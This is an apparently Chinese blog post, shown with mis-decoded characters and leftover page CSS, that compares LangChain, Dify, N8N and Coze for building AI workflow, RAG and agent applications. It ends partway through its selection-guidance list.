ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€ï¼šAI å¦‚ä½•åˆ†ç±»</h2>
<p>éšç€ <strong>2026</strong> å¹´çš„å¼€å§‹ï¼Œä¸ç®¡æ˜¯ A è‚¡ AI åº”ç”¨çš„çˆ†å‘ï¼Œè¿˜æ˜¯åƒé—®æ•´åˆé˜¿é‡Œç”Ÿæ€ï¼Œè¿˜æ˜¯å›½å¤– Gemini ã€OpenAI åœ¨å¤§æ¨¡å‹é‡Œé¢æ³¨å…¥å¹¿å‘Šï¼Œè¿™æ³¨å®šäº†ä¼šæ˜¯ AI åº”ç”¨çˆ†å‘çš„ä¸€å¹´ã€‚å½“æˆ‘ä»¬åœ¨ä½¿ç”¨ AI å»åšåº”ç”¨æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå¯èƒ½æ¥è§¦ä¸‰ä¸ªæ¦‚å¿µï¼Œ<strong>Workflow</strong> ã€<strong>Agent</strong>ã€<strong>RAG</strong>ã€‚
ä»–ä»¬åˆ†åˆ«å¯¹åº”ä¸åŒçš„ä¸šåŠ¡åœºæ™¯ï¼Œæ¯”å¦‚ï¼š</p>
<ol>
<li>Workflowï¼šAIçˆ†æ–‡ã€è§†é¢‘ï¼›</li>
<li>RAGï¼šAIå®¢æœã€çŸ¥è¯†é—®ç­”åŠ©æ‰‹ï¼›</li>
<li>Agentï¼šAI åŒ»ç”Ÿã€AI å¾‹å¸ˆï¼›</li>
</ol>
<p>å·¥æ¬²å–„å…¶äº‹å¿…å…ˆåˆ©å…¶å™¨ï¼Œè¿™ç¯‡æ–‡ç« ä¸è®²å¦‚ä½•æ­å»º AI åº”ç”¨ ï¼Œåªè®²é€‰å‹ã€‚å¸‚é¢ä¸Šå·¥ä½œæµå·¥å…·ç¹å¤šï¼Œçƒ­é—¨çš„æœ‰ LangChainã€Difyã€N8Nã€Cozeï¼Œå¤§è‡´å¯åˆ†ä¸ºä¸¤ç±»ï¼š</p>
<p><strong>ä½ä»£ç å¹³å°</strong>ï¼šDifyã€N8Nã€Coze</p>
<p><strong>çº¯ä»£ç æ¡†æ¶</strong>ï¼šLangChain</p>
<p>è¿™äº›å·¥å…·æ ¸å¿ƒå‡å›´ç»•å·¥ä½œæµ<strong>å¯è§†åŒ–ç¼–æ’</strong>ä¸<strong>æ™ºèƒ½ä½“å¼€å‘èƒ½åŠ›</strong>å±•å¼€ï¼Œ<strong>å·¥ä½œæµå¯è§†åŒ–ç¼–</strong>æ’ï¼Œå°±åƒæ˜¯ç»˜åˆ¶ä¸€å¹…æµç¨‹å›¾ï¼Œä½ å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°<strong>æ•°æ®çš„æµå‘å’Œå„ä¸ªæ“ä½œçš„é¡ºåº</strong>ï¼Œé€šè¿‡ç®€å•æ‹–æ‹½è¿æ¥å°±èƒ½å®šä¹‰å¤æ‚ä¸šåŠ¡æµç¨‹ï¼›<strong>æ™ºèƒ½ä½“å¼€å‘</strong>åˆ™èµ‹äºˆåº”ç”¨æ™ºèƒ½åŒ–èƒ½åŠ›ï¼Œä½¿å…¶èƒ½ç†è§£è‡ªç„¶è¯­è¨€ã€è‡ªä¸»å†³ç­–ã€‚åªæ˜¯åœ¨æŠ€æœ¯é—¨æ§›ã€åŠŸèƒ½ä¾§é‡ä¸Šå·®å¼‚æ˜æ˜¾ã€‚è®©æˆ‘ä»¬ä¸€ä¸€çœ‹ä¸€ä¸‹å·®å¼‚ã€‚</p>
<h2 data-id="heading-1">å„å¹³å°æ ¸å¿ƒåŠŸèƒ½æ·±åº¦å‰–æ</h2>
<h3 data-id="heading-2">LangChainï¼šå¤æ‚ AI åº”ç”¨çš„ä¸‡é‡‘æ²¹</h3>
<p><strong>LangChain</strong> æ ¸å¿ƒæ˜¯æä¾›æ¨¡å—åŒ–ç»„ä»¶ï¼Œå°†æ¨¡å‹ã€æç¤ºã€å·¥å…·è°ƒç”¨ã€è®°å¿†ç­‰èƒ½åŠ›æ‹†åˆ†å°è£…ï¼Œæ–¹ä¾¿å¼€å‘è€…å¿«é€Ÿæ‹¼æ¥å¤æ‚æµç¨‹ï¼Œå®ç° Chainsï¼ˆé“¾ï¼‰ã€Agentsï¼ˆä»£ç†ï¼‰å’Œæ£€ç´¢å™¨çš„çµæ´»ç»„åˆã€‚æ”¯æŒå¤æ‚å¤šæ™ºèƒ½ä½“ç¼–æ’ã€æ¡ä»¶åˆ†æ”¯ã€å¹¶è¡Œä»»åŠ¡ä¸å…¨å±€çŠ¶æ€ç®¡ç†ï¼Œèƒ½å¤„ç†å¤æ‚æµç¨‹çš„æ„å»ºã€‚</p>
<ul>
<li>
<p><strong>åœ°å€ï¼š</strong> <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.langchain.com%2F" target="_blank" title="https://www.langchain.com/" ref="nofollow noopener noreferrer">www.langchain.com/</a></strong></p>
</li>
<li>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¸Šé™é«˜ï¼š</strong> å®ƒæ˜¯ä»£ç åº“ï¼ˆLibraryï¼‰è€Œéå¹³å°ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ç”¨å®ƒå®ç°ä»»ä½•é€»è¾‘ï¼Œä¸å—å›¾å½¢åŒ–ç•Œé¢ï¼ˆGUIï¼‰çš„é™åˆ¶ã€‚</p>
</li>
<li>
<p><strong>å·¥ç¨‹åŒ–ç¨‹åº¦é«˜</strong> ï¼šæä¾› LangSmithï¼ˆå¯è§‚æµ‹æ€§ï¼‰ã€LangGraphï¼ˆå·¥ä½œæµç¼–æ’ï¼‰ç­‰é…å¥—å·¥å…·ï¼Œæ”¯æŒä»åŸå‹éªŒè¯åˆ°ç”Ÿäº§éƒ¨ç½²çš„å…¨æµç¨‹ï¼Œæ»¡è¶³ä¼ä¸šçº§åº”ç”¨çš„ç¨³å®šæ€§å’Œå¯é æ€§è¦æ±‚ã€‚</p>
</li>
<li>
<p><strong>ç”Ÿæ€é€‚é…ï¼š</strong> å‡ ä¹æ‰€æœ‰æ–°çš„æ¨¡å‹ã€å‘é‡åº“ã€å·¥å…·éƒ½ä¼šç¬¬ä¸€æ—¶é—´æ”¯æŒ LangChainã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>åŠ£åŠ¿ï¼š</strong></p>
<ul>
<li>
<p><strong>é—¨æ§›é«˜ï¼š</strong> è¢«æˆç§°ä¸ºâ€œèƒ¶æ°´ä»£ç çš„è¿·å®«â€ï¼Œè°ƒè¯•å›°éš¾ï¼Œå¯¹å¼€å‘è€…çš„å·¥ç¨‹èƒ½åŠ›è¦æ±‚é«˜ã€‚</p>
</li>
<li>
<p><strong>ç»´æŠ¤æˆæœ¬é«˜ï¼š</strong> ç‰ˆæœ¬è¿­ä»£å¿«ï¼Œä»£ç å®¹æ˜“è¿‡æ—¶ï¼ˆBreaking Changesï¼‰ï¼Œä¼ä¸šéœ€è¦ä¸“é—¨çš„å›¢é˜Ÿç»´æŠ¤ã€‚</p>
</li>
</ul>
<p><img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/68be031720db4466b1f8336865f82239.png~tplv-noop.jpeg?rk3s=49177a0b&amp;x-expires=1768836499&amp;x-signature=9JCRddLuHzlGb7Ve1OAy08p%2B%2F%2FQ%3D&amp;resource_key=be77422a-31ad-40f3-9f72-bcd7eb28156c&amp;resource_key=be77422a-31ad-40f3-9f72-bcd7eb28156c" alt="Image" loading="lazy"/></p>
</li>
</ul>
<p><strong>é€‚åˆè°ï¼Ÿ</strong> æ‹¥æœ‰å¼ºåç«¯ç ”å‘èƒ½åŠ›çš„å›¢é˜Ÿï¼Œéœ€æ„å»ºé«˜åº¦å®šåˆ¶åŒ–ã€æå¤æ‚æ ¸å¿ƒä¸šåŠ¡ç³»ç»Ÿçš„åœºæ™¯ã€‚</p>
<hr/>
<h3 data-id="heading-3">Difyï¼šå‡è¡¡çš„ä¼ä¸šçº§ä¼˜é€‰</h3>
<p>Dify æœ€å¤§çš„ç‰¹ç‚¹æ˜¯â€œæ— çŸ­æ¿å‡è¡¡æ€§â€ï¼Œé›†æˆäº†ä» Prompt ç¼–æ’ã€RAG æ£€ç´¢å¼•æ“åˆ° Agent æ¡†æ¶ã€å·¥ä½œæµçš„å…¨å¥—æŠ€æœ¯æ ˆï¼Œå®šä½æ¨ªè·¨ MVP éªŒè¯ä¸ä¼ä¸šçº§è½åœ°ã€‚å®ƒä¸è¿½æ±‚å•ä¸€åŠŸèƒ½æè‡´ï¼Œå´èƒ½æ»¡è¶³ç»å¤§å¤šæ•°ä¼ä¸šçš„ AI åº”ç”¨éœ€æ±‚ï¼Œæ— è®ºæ˜¯æ™ºèƒ½å®¢æœã€çŸ¥è¯†ç®¡ç†è¿˜æ˜¯è¥é”€è‡ªåŠ¨åŒ–ï¼Œéƒ½èƒ½å¿«é€Ÿé€‚é…ã€‚</p>
<ul>
<li>
<p><strong>åœ°å€ï¼š</strong> <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fdify.ai%2F" target="_blank" title="https://dify.ai/" ref="nofollow noopener noreferrer">dify.ai/</a></strong></p>
</li>
<li>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>
<p><strong>æ‰€è§å³æ‰€å¾—çš„ RAGï¼š</strong> å†…ç½®äº†æå…¶ä¸“ä¸šçš„çŸ¥è¯†åº“å¤„ç†ç®¡é“ï¼ˆPDF è§£æã€åˆ†æ®µæ¸…æ´—ã€æ··åˆæ£€ç´¢ã€é‡æ’ï¼‰ï¼Œæ˜¯ç›®å‰å¼€æºç•Œ RAG ä½“éªŒçš„ç¬¬ä¸€æ¢¯é˜Ÿã€‚</p>
</li>
<li>
<p><strong>LLMOps é—­ç¯ï¼š</strong> ä¸ä»…ä»…æ˜¯å¼€å‘ï¼Œè¿˜åŒ…å«äº†æ—¥å¿—ç›‘æ§ã€ç”¨æˆ·æ ‡æ³¨ã€Token æˆæœ¬æ ¸ç®—ã€API ç®¡ç†ã€‚</p>
</li>
<li>
<p><strong>Workflow ç¼–æ’ï¼š</strong> æä¾›äº†å¼ºå¤§çš„ DSLï¼ˆé¢†åŸŸç‰¹å®šè¯­è¨€ï¼‰å¯è§†åŒ–ç¼–æ’ï¼Œæ—¢èƒ½åšç®€å•çš„å¯¹è¯ Botï¼Œä¹Ÿèƒ½é€šè¿‡ HTTP èŠ‚ç‚¹å’Œä»£ç èŠ‚ç‚¹å®ç°å¤æ‚é€»è¾‘ã€‚</p>
</li>
<li>
<p><strong>å¼€æºå‹å¥½ï¼š</strong> æ´»è·ƒçš„å¼€æºç¤¾åŒºï¼Œä¼ä¸šå¯ç§æœ‰åŒ–éƒ¨ç½²å¹¶æ ¹æ®éœ€æ±‚äºŒå¼€ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>åŠ£åŠ¿ï¼š</strong></p>
<ul>
<li><strong>è¶…å¤æ‚é€»è¾‘ç•¥æ˜¾åƒåŠ›ï¼š</strong> è™½ç„¶ Workflow å¾ˆå¼ºï¼Œä½†é¢å¯¹æå…¶å˜æ€çš„æ•°å­¦é€»è¾‘æˆ–å¤šå±‚åµŒå¥—å¾ªç¯ï¼Œå¯èƒ½ä¸å¦‚ç›´æ¥å†™ä»£ç ï¼ˆLangChainï¼‰çµæ´»ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/13cbcb91fd5c42b5a2a84f4fe6e57d7c.png~tplv-noop.jpeg?rk3s=49177a0b&amp;x-expires=1768836499&amp;x-signature=Dj3xkxq1iAh56lRYaM1NYud340M%3D&amp;resource_key=06040ec7-ef40-473f-877b-840086bfe6a9&amp;resource_key=06040ec7-ef40-473f-877b-840086bfe6a9" alt="Image" loading="lazy"/></p>
<p><strong>é€‚åˆè°ï¼Ÿ</strong> ä¼ä¸šå†…éƒ¨çš„ AI ç ”å‘ä¸ä¸šåŠ¡æ··ç¼–å›¢é˜Ÿã€‚å¸Œæœ›å¿«é€Ÿè½åœ°ç”Ÿæˆå¼ AI åº”ç”¨ï¼ˆå¦‚ä¼ä¸šçŸ¥è¯†åº“ã€æ™ºèƒ½å®¢æœï¼‰ï¼Œä¸”é‡è§†æ•°æ®éšç§å’Œåç»­è¿è¥ã€‚</p>
<hr/>
<h3 data-id="heading-4">N8Nï¼šä¸šåŠ¡æµç¨‹é›†æˆçš„è‡ªåŠ¨åŒ–ä¸“å®¶</h3>
<p>N8N æœ€åˆå®šä½ä¾¿æ˜¯å·¥ä½œæµè‡ªåŠ¨åŒ–ä¸ç³»ç»Ÿé›†æˆï¼Œæ ¸å¿ƒä¼˜åŠ¿å¹¶é AI åŸç”Ÿèƒ½åŠ›ï¼Œè€Œæ˜¯å¼ºå¤§çš„â€œè¿æ¥æ€§â€â€”â€”æ‹¥æœ‰å‡ ç™¾ä¸ªé›†æˆæ¥å£å’Œæ¨¡æ¿åº“ï¼Œèƒ½è½»æ¾æ‰“é€šä¼ä¸šå†…éƒ¨ ERPã€CRMã€ç‰©æµã€æ”¯ä»˜ç­‰å„ç±»ç³»ç»Ÿï¼Œä½†åœ¨ 2024-2025 å¹´é—´ï¼Œå®ƒé€šè¿‡å¼•å…¥ <strong>AI Agent èŠ‚ç‚¹</strong> å°† AI èƒ½åŠ›æ— ç¼åµŒå…¥ç°æœ‰ä¸šåŠ¡æµç¨‹ï¼Œæ‰®æ¼”â€œæ•°æ®æ¡¥æ¢â€ä¸â€œè°ƒåº¦ä¸­å¿ƒâ€çš„è§’è‰²ã€‚</p>
<ul>
<li>
<p><strong>åœ°å€ï¼š</strong> <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fn8n.io" target="_blank" title="https://n8n.io" ref="nofollow noopener noreferrer">n8n.io</a></strong></p>
</li>
<li>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¸ä¸šåŠ¡ç³»ç»Ÿæ— ç¼èåˆï¼š</strong> å®ƒçš„å¼ºé¡¹ä¸åœ¨äºå¯¹è¯æ¡†ï¼Œè€Œåœ¨äºâ€œè¿æ¥â€ã€‚ä¾‹å¦‚ï¼š<em>å½“ HubSpot æ–°å¢å®¢æˆ· -&gt; è§¦å‘ AI åˆ†æ -&gt; å†™å…¥ Google Sheet -&gt; å‘é€ Slack é€šçŸ¥</em>ã€‚è¿™ç§æ¶‰åŠä¼ ç»Ÿ IT ç³»ç»Ÿçš„æµç¨‹ï¼Œn8n æ˜¯ç‹è€…ã€‚</p>
</li>
<li>
<p><strong>å¯è§†åŒ–é€»è¾‘ï¼š</strong> å³ä½¿æ˜¯å¤æ‚çš„å¾ªç¯å’Œåˆ†æ”¯ï¼Œé€šè¿‡è¿çº¿ä¹Ÿèƒ½æ¸…æ™°å±•ç¤ºï¼Œä¸”æ”¯æŒå†™å…¥ JavaScript/Python ä»£ç ç‰‡æ®µå¤„ç†æ•°æ®ã€‚</p>
</li>
<li>
<p><strong>éšç§ä¸éƒ¨ç½²ï¼š</strong> æ”¯æŒè‡ªæ‰˜ç®¡ï¼ˆDocker éƒ¨ç½²ï¼‰ï¼Œæ•°æ®å®Œå…¨åœ¨è‡ªå·±æ‰‹ä¸­ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>åŠ£åŠ¿ï¼š</strong></p>
<ul>
<li>
<p><strong>RAG èƒ½åŠ›è¾ƒå¼±ï¼š</strong> è™½ç„¶èƒ½åšï¼Œä½†æ²¡æœ‰å†…ç½®åƒ Dify é‚£æ ·å®Œå–„çš„åˆ†æ®µã€æ¸…æ´—ã€æ··åˆæ£€ç´¢æœºåˆ¶ï¼Œé€šå¸¸éœ€è¦å¤–æ¥å‘é‡åº“ã€‚</p>
</li>
<li>
<p><strong>éåº”ç”¨æ„å»ºå¹³å°ï¼š</strong> å®ƒå¾ˆéš¾ç›´æ¥ç”Ÿæˆä¸€ä¸ªç»™æœ€ç»ˆç”¨æˆ·ä½¿ç”¨çš„æ¼‚äº® Web App ç•Œé¢ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/27edfa849972429c9abf5866ee74d578.png~tplv-noop.jpeg?rk3s=49177a0b&amp;x-expires=1768836499&amp;x-signature=S%2BG%2Bn16t2%2F4dfUOE8VPNcKbY4DI%3D&amp;resource_key=3e3e268d-d846-40c8-b3e8-c57d149c9de3&amp;resource_key=3e3e268d-d846-40c8-b3e8-c57d149c9de3" alt="Image" loading="lazy"/></p>
<p><strong>é€‚åˆè°ï¼Ÿ</strong> å¸Œæœ›å°† AI èƒ½åŠ›åµŒå…¥åˆ°ä¼ä¸šç°æœ‰ ERP/CRM/åŠå…¬æµç¨‹ä¸­çš„åœºæ™¯ï¼Œç›®å‰æ®æˆ‘æ‰€çŸ¥ï¼Œå›½å†…ç”¨çš„æ¯”è¾ƒå°‘ã€‚</p>
<hr/>
<h3 data-id="heading-5">Cozeï¼šå¿«é€ŸéªŒè¯ã€æµé‡å¤§</h3>
<p>Coze æœ€çªå‡ºçš„ä¼˜åŠ¿æ˜¯å­—èŠ‚ç³»ç”Ÿæ€é—­ç¯ï¼Œæ­å»ºå¥½çš„ AI åº”ç”¨å¯ç›´æ¥å‘å¸ƒåˆ°æŠ–éŸ³ã€é£ä¹¦ã€è±†åŒ…ç­‰å¹³å°ï¼Œè·å¾—å¤©ç„¶æµé‡æ”¯æŒï¼Œé€‚åˆæƒ³è¦å¿«é€ŸéªŒè¯å•†ä¸šä»·å€¼ã€æŠ¢å  C ç«¯å¸‚åœºçš„åœºæ™¯ã€‚ï¼Œä¸»æ‰“â€œè®©ä¸ä¼šå†™ä»£ç çš„äººä¹Ÿèƒ½åš AI Botâ€ã€‚å®ƒçš„æ ¸å¿ƒé€»è¾‘æ˜¯â€œæ’ä»¶åŒ–â€å’Œâ€œç”Ÿæ€åŒ–â€ã€‚</p>
<ul>
<li>
<p><strong>åœ°å€ï¼š</strong> <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.coze.cn%2F" target="_blank" title="https://www.coze.cn/" ref="nofollow noopener noreferrer">www.coze.cn/</a></strong></p>
</li>
<li>
<p><strong>æ ¸å¿ƒä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¸Šæ‰‹æœ€å¿«ï¼š</strong> å‡ ä¹ä¸éœ€è¦ä»»ä½•æŠ€æœ¯èƒŒæ™¯ï¼Œé€šè¿‡è‡ªç„¶è¯­è¨€æè¿°å°±èƒ½ç”Ÿæˆ Botã€‚</p>
</li>
<li>
<p><strong>æ’ä»¶ç”Ÿæ€æå…¶ä¸°å¯Œï¼š</strong> æœç´¢ã€æ–°é—»ã€ç”šè‡³å­—èŠ‚ç³»ï¼ˆæŠ–éŸ³/å¤´æ¡/é£ä¹¦ï¼‰çš„æ•°æ®æ¥å£ï¼Œè¿™æ˜¯å…¶ä»–å¹³å°éš¾ä»¥æ¯”æ‹Ÿçš„èµ„æºä¼˜åŠ¿ã€‚</p>
</li>
<li>
<p><strong>å¤šå·¥ä½œæµä¸å¡ç‰‡ï¼š</strong> æ”¯æŒéå¸¸ç²¾ç¾çš„ UI å¡ç‰‡è¾“å‡º,æ”¯æŒè±†åŒ…ã€‚</p>
</li>
</ul>
</li>
<li>
<p><strong>åŠ£åŠ¿ï¼š</strong></p>
<ul>
<li>
<p><strong>é—­æºï¼š</strong> ä¾èµ–å­—èŠ‚ä»·æ ¼ç­–ç•¥ï¼Œæ•°æ®æœ‰æ³„æ¼é£é™©ï¼Œç±»ä¼¼ saas æœåŠ¡ï¼Œè™½ç„¶æœ‰å¼€æºç‰ˆæœ¬ï¼Œä½†å‡ ä¹ä¸ä¼šç”¨å¼€æºç‰ˆæœ¬ã€‚</p>
</li>
<li>
<p><strong>æ·±åº¦å®šåˆ¶éš¾ï¼š</strong> å¦‚æœä½ æƒ³æ”¹å†™ RAG çš„æ£€ç´¢ç®—æ³•ï¼Œæˆ–è€…å¾®è°ƒæ¨¡å‹å‚æ•°ï¼ŒCoze æä¾›çš„ä¿®æ”¹ç©ºé—´ç›¸å¯¹æœ‰é™ã€‚</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p3-flow-imagex-sign.byteimg.com/tos-cn-i-a9rns2rl98/00fb50b3e9f846b5b817f49e718c98d6.png~tplv-noop.jpeg?rk3s=49177a0b&amp;x-expires=1768836499&amp;x-signature=vZCbodY8xIQVE5G%2BI59CSEMXS1w%3D&amp;resource_key=7d079576-b06f-46f0-a18f-1f350272996b&amp;resource_key=7d079576-b06f-46f0-a18f-1f350272996b" alt="Image" loading="lazy"/></p>
<p><strong>é€‚åˆè°ï¼Ÿ</strong> å¸‚åœº/è¿è¥äººå‘˜ã€ä¸ªäººåˆ›ä½œè€…ã€éªŒè¯æƒ³æ³•çš„ PMã€‚é€‚åˆåš C ç«¯å¨±ä¹ã€è¥é”€æ´»åŠ¨ã€ä¸ªäººåŠ©ç†ç±»åº”ç”¨ã€‚</p>
<hr/>
<h2 data-id="heading-6">æ·±åº¦æ¨ªå‘å¯¹æ¯”æ€»ç»“</h2>
<p>ç»“åˆå„å¹³å°æœ€æ–°æ¶æ„ä¸å¼€æºåè®®ï¼Œæˆ‘ä»¬ä»<strong>å¼€å‘èŒƒå¼ã€é›†æˆå“²å­¦ã€åˆè§„æ€§</strong>ç­‰ 7 ä¸ªæ ¸å¿ƒç»´åº¦è¿›è¡Œäº†å…¨æ–¹ä½å¯¹æ¯”ï¼š</p>





























































<table><thead><tr><th align="left">ç»´åº¦</th><th align="left"><strong>LangChain</strong></th><th align="left"><strong>n8n</strong></th><th align="left"><strong>Dify</strong></th><th align="left"><strong>Coze (æ‰£å­)</strong></th></tr></thead><tbody><tr><td align="left"><strong>æ ¸å¿ƒå®šä½</strong></td><td align="left"><strong>ä»£ç æ¡†æ¶ (Library)</strong><br/>åº•å±‚æ¶æ„ä¸å¤æ‚é€»è¾‘å®ç°</td><td align="left"><strong>å·¥ä½œæµè‡ªåŠ¨åŒ– (Workflow)</strong><br/>ç³»ç»Ÿé—´çš„â€œèƒ¶æ°´â€ä¸æ€»è°ƒåº¦</td><td align="left"><strong>LLM åº”ç”¨å¼€å‘å¹³å° (BaaS)</strong><br/>ä¼ä¸šçº§ AI ä¸­å°ä¸ RAG å¼•æ“</td><td align="left"><strong>AI Bot æ„å»ºå¹³å° (SaaS)</strong><br/>å¿«é€Ÿå¼€å‘ä¸ C ç«¯åˆ†å‘</td></tr><tr><td align="left"><strong>é›†æˆå“²å­¦</strong></td><td align="left"><strong>SDK ä»£ç çº§é›†æˆ</strong><br/>ä½œä¸ºä¾èµ–åº“åµŒå…¥é¡¹ç›®ï¼Œæœ€çµæ´»</td><td align="left"><strong>è¿æ¥å™¨ (Connector)</strong><br/>ä¸»æ‰“ 500+ åº”ç”¨çš„è¾“å…¥/è¾“å‡ºå¯¹æ¥</td><td align="left"><strong>API First (åç«¯å³æœåŠ¡)</strong><br/>ä½œä¸ºç‹¬ç«‹åç«¯ï¼Œä¾›å‰ç«¯/ä¸šåŠ¡è°ƒç”¨</td><td align="left"><strong>å‘å¸ƒæ¸ é“ (Publish)</strong><br/>ä¸»æ‰“å‘å¸ƒåˆ°é£ä¹¦/å¾®ä¿¡/Discord</td></tr><tr><td align="left"><strong>RAG èƒ½åŠ›</strong></td><td align="left">ğŸŒŸğŸŒŸğŸŒŸğŸŒŸğŸŒŸ<br/><strong>å…¨å®šåˆ¶ï¼š</strong> éœ€æ‰‹å†™åˆ‡ç‰‡/æ£€ç´¢é€»è¾‘</td><td align="left">ğŸŒŸğŸŒŸ<br/><strong>å¼±ï¼š</strong> ä»…ä½œä¸ºæµç¨‹ä¸€ç¯ï¼Œé€šå¸¸éœ€å¤–æ¥</td><td align="left">ğŸŒŸğŸŒŸğŸŒŸğŸŒŸ<br/><strong>å¼º/å†…ç½®ï¼š</strong> åŒ…å«æ¸…æ´—/é‡æ’/æ··åˆæ£€ç´¢</td><td align="left">ğŸŒŸğŸŒŸğŸŒŸ<br/><strong>ä¸­ï¼š</strong> ä¾èµ–æ’ä»¶ï¼Œæ·±åº¦è°ƒä¼˜éš¾</td></tr><tr><td align="left"><strong>å¼€æºåè®®</strong></td><td align="left"><strong>MIT (å®Œå…¨å¼€æº)</strong><br/>å…è´¹å•†ç”¨ï¼Œæ— é™åˆ¶</td><td align="left"><strong>Fair-Code (æºä»£ç å¯ç”¨)</strong><br/>å†…éƒ¨è‡ªç”¨å…è´¹ï¼Œå¯¹å¤–å”®å–éœ€æˆæƒ</td><td align="left"><strong>Apache 2.0 (å•†ä¸šå‹å¥½)</strong><br/>å…è®¸ä¼ä¸šäºŒå¼€ä¸å•†ç”¨é—­æº</td><td align="left"><strong>é—­æº (SaaS ä¸ºä¸»)</strong><br/>ä¾èµ–å¹³å°ï¼Œæ•°æ®åœ¨äº‘ç«¯</td></tr><tr><td align="left"><strong>ç§æœ‰åŒ–éƒ¨ç½²</strong></td><td align="left"><strong>å®Œå…¨è‡ªç”±</strong><br/>è¿è¡Œåœ¨ä»»ä½• Python/JS ç¯å¢ƒ</td><td align="left"><strong>å®Œå…¨æ”¯æŒ</strong><br/>Docker ä¸€é”®éƒ¨ç½²ï¼Œæ•°æ®è‡ªæ§</td><td align="left"><strong>å®Œå…¨æ”¯æŒ</strong><br/>æ”¯æŒæºç /Dockerï¼Œæ— åŠŸèƒ½é˜‰å‰²</td><td align="left"><strong>å—é™ / æ˜‚è´µ</strong><br/>ç§æœ‰ç‰ˆé€šå¸¸åŠŸèƒ½æ»åæˆ–æˆæœ¬é«˜</td></tr><tr><td align="left"><strong>ç¼–æ’èƒ½åŠ›</strong></td><td align="left"><strong>æå¼º (ä»£ç )</strong><br/>LangGraph æ”¯æŒå¾ªç¯/å¤šæ™ºèƒ½ä½“</td><td align="left"><strong>å¼º (å¯è§†åŒ–)</strong><br/>æ“…é•¿çº¿æ€§ä¸åˆ†æ”¯æµç¨‹ï¼Œå¼±äºå¾ªç¯</td><td align="left"><strong>ä¸­ (å¯è§†åŒ–)</strong><br/>DSL ç¼–æ’ï¼Œé€‚åˆæ ‡å‡†ä¸šåŠ¡é€»è¾‘</td><td align="left"><strong>ä¸­ (å¯è§†åŒ–)</strong><br/>é€‚åˆå¯¹è¯æµï¼Œä¸é€‚åˆå¤æ‚ç³»ç»Ÿ</td></tr><tr><td align="left"><strong>ä¸Šæ‰‹éš¾åº¦</strong></td><td align="left">ğŸ’€ <strong>é«˜ (Hard)</strong><br/>éœ€ç†Ÿç»ƒæŒæ¡ Python/JS</td><td align="left">ğŸ˜ <strong>ä¸­ (Medium)</strong><br/>éœ€ç†è§£ JSON æ•°æ®ç»“æ„</td><td align="left">ğŸ˜Š <strong>ä¸­ä½ (Friendly)</strong><br/>äº§å“ç»ç†/ç ”å‘å‡å¯ä¸Šæ‰‹</td><td align="left">ğŸ˜ <strong>ä½ (Easy)</strong><br/>è‡ªç„¶è¯­è¨€+æ‹–æ‹½å³å¯å®Œæˆ</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-7">ğŸ’¡ ç»´åº¦è§£è¯»ä¸é€‰å‹å…³é”®ç‚¹</h3>
<ol>
<li><strong>å…³äºâ€œé›†æˆå“²å­¦â€çš„æœ¬è´¨åŒºåˆ«ï¼š</strong>
<ul>
<li><strong>Coze</strong> çš„æ€è·¯æ˜¯**â€œå‘å¸ƒâ€**ï¼šå®ƒå¸Œæœ›ä½ æŠŠ Bot å‘å¸ƒåˆ°å®ƒçš„ç”Ÿæ€ï¼ˆé£ä¹¦ã€æŠ–éŸ³ã€æ˜é‡‘ï¼‰é‡Œå»ï¼Œå®ƒæ˜¯æµé‡çš„å…¥å£ã€‚</li>
<li><strong>Dify</strong> çš„æ€è·¯æ˜¯**â€œAPIâ€**ï¼šå®ƒé€šè¿‡ API æŠŠ AI èƒ½åŠ›è¾“é€ç»™ä½ ç°æœ‰çš„ App æˆ–ç½‘ç«™ï¼Œå®ƒæ˜¯ä½ çš„â€œAI åç«¯â€ã€‚</li>
